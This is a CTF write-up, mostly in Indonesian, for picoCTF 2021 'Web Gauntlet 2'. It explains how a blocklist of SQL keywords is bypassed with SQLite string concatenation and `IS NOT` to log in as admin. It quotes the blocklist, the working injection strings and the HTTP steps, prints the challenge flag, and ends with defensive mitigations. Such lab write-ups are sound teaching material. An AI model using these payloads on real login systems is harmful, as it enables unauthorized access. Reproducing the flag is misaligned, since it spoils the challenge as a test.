# 174 - Web Gauntlet 2 (Web Exploitation, picoCTF 2021, Medium)

## Challenge Metadata
- ID: 174 | Event: picoCTF 2021 | Author: picoCTF
- Category: Web Exploitation | Difficulty: Medium (2)
- Flag: `academy{0n3_m0r3_t1m3_38c285e0}`

## Problem Statement & Scope
Lab on-demand: login SQLite satu putaran. `filter.php` memblokir token
`or and true false union like = > < ; -- /* */ admin` plus cek panjang.
Login admin yang sukses set `$_SESSION["winner2"]=1`; `filter.php`
berikutnya menampilkan source (`highlight_file`) berisi flag lalu
mereset sesi (jangan refresh: ambil sekali).

## Teori & Akar Kerentanan (Root Cause)
1. Blocklist ≠ keamanan: filter menolak kata `admin` tapi SQLite
   operator `||` konkatenasi string merekonstruksi `admin` dari
   `admi'||'n` tanpa literal terlarang (CWE-1842 allowlist failure).
2. Perbandingan `IS NOT` lolos dari blokir `=`/`like`/`true`:
   `'x' IS NOT 'x'` bernilai TRUE tanpa token terlarang.
3. Query akhir: `... username='admi'||'n' AND password='x' IS NOT 'x'`
   -> login sebagai admin (query debug bahkan di-echo ke halaman).
4. Flag di source server (`// academy{...}` di filter.php) hanya tampil
   pasca-auth yang benar; sesi menang satu-kali pakai.

## Rekonstruksi Eksploitasi Step-by-Step
1. `PUT /api/challenges/174/instance/` -> RUNNING
   `chatelaine.cylabacademy.net:48853`; baca `GET /filter.php`.
2. `POST /index.php` (`user=admi'||'n`, `pass=x' IS NOT 'x`),
   simpan `PHPSESSID`.
3. `GET /filter.php` dengan cookie sesi -> source highlight berisi flag.
4. Submit `POST /api/submissions/` -> `correct: true`; `DELETE` instance.

## Flag & Verifikasi
- `academy{0n3_m0r3_t1m3_38c285e0}` (`correct: true`, historical false).

## Takeaway Kompetensi LKS & Mitigasi Defensif
- Prepared statements / parameter binding; jangan interpolasi input ke SQL.
- Allowlist input + ORM; blocklist token SQL selalu bisa diakali operator
  alternatif (`||`, `IS`, `GLOB`, komentar bersarang).
- Jangan echo query SQL ke klien (information disclosure).
- Jangan simpan flag di source web; flag di secret store server-side.
